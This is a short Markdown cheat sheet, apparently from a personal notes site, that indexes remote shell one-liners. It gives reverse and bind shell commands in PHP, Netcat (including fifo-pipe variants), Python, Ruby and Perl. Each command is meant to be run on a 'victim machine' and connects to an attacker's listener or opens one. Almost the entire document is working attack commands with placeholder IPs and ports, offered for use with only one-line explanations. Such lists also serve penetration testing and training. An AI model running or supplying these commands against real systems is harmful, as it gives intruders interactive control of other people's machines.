---
layout: default
---
<< [Home](./)

# Remote shells index
* [PHP](#PHP)
* [Netcat](#Netcat)
* [Python](#Python)
* [Ruby](#Ruby)
* [Perl](#Perl)


## PHP

Reverse shell using php script in the command line. Run on victim machine:
```bash
php -r '$sock=fsockopen("[remote_ip]",[remote_port]);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Netcat

Launch nc listener.
```bash
nc -lvp [port]
```
Alt.
```bash
nc -lkvp [port]
```

Connect to nc listener and throw a bash shell to it. (Creating a reverse shell if done from victim machine).
```bash
nc [ip] [port] -e /bin/bash
```

Create remote shell using fifo file as pipe. (Run command on victim machine to start a listener.)
```bash
rm -f /tmp/pipe;mkfifo /tmp/pipe;sh /tmp/pipe | nc -l -s [victim_ip] -p [victim_port] > /tmp/pipe
```
Alt.
```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l -s [victim_ip] -p [victim_port] > /tmp/f
```

## Python

Connect to listening nc. Run on victim machine: (Replace ip and port with listening machine...)
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[remote_ip]",[remote_port]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Ruby

Open TCPSocket to listening attacker machine. Run on victim machine:
```bash
ruby -rsocket -e'f=TCPSocket.open("[remote_ip]",[remote_port]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Perl

Open a socket to listening attacker machine.
```bash
perl -e 'use Socket;$i="[remote_ip]";$p=[remote_port];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
